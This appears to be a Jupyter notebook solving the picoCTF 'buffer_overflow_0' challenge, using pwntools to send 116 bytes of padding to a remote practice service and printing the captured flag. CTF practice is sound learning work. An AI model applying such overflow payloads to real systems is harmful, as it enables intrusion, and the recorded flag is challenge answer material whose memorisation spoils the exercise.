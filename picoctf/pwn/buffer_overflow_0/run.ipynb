{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 53891\n",
      "[x] Opening connection to saturn.picoctf.net on port 53891: Trying 13.59.203.175\n",
      "[+] Opening connection to saturn.picoctf.net on port 53891: Done\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}\\n'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwn import ELF, context, remote, FmtStr, fmtstr_payload\n",
    "import re\n",
    "r = remote('saturn.picoctf.net', 53891)\n",
    "r.recvuntil(b'Input: ')\n",
    "r.sendline(b\"a\"*116)\n",
    "r.recvline()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
